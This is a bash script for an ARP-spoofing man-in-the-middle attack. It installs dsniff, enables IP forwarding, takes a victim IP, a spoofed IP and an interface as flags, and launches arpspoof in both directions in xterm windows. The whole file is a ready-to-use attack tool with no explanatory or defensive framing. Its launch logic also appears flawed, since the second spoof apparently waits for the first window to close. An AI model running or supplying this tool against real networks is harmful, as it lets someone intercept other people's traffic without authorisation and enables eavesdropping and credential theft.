#!/bin/bash

#defining colour schemas
NONE='\033[00m'
RED='\033[01;31m'
GREEN='\033[01;32m'
YELLOW='\033[01;33m'
PURPLE='\033[01;35m'
CYAN='\033[01;36m'
WHITE='\033[01;37m'
BOLD='\033[1m'
BLINK='\033[5m'
UNDERLINE='\033[4m'

#check for packages
pth=$(which dsniff)
if [ -z "$pth" ]
then
      sudo apt install dsniff
fi

#Enable IP forwading
sudo sysctl -w net.ipv4.ip_forward=1

#getting variables from command line
while test $# -gt 0; do
           case "$1" in
                -o)
                    shift
                    ori_ip=$1
                    shift
                    ;;
                -t)
                    shift
                    spoof_ip=$1
                    shift
                    ;;
                -i)
                    shift
                    inter=$1
                    shift
                    ;;
                *)
                   echo "$1 is not a recognized flag!"
                   return 1;
                   ;;
          esac
done  

echo "Original IP : $ori_ip";
echo "IP to Spoof : $spoof_ip";
echo "Interface : $inter"


xterm -hold -e sudo $(which arpspoof) -i $inter -t $ori_ip $spoof_ip

xterm -hold -e sudo $(which arpspoof) -i $inter -t $spoof_ip $ori_ip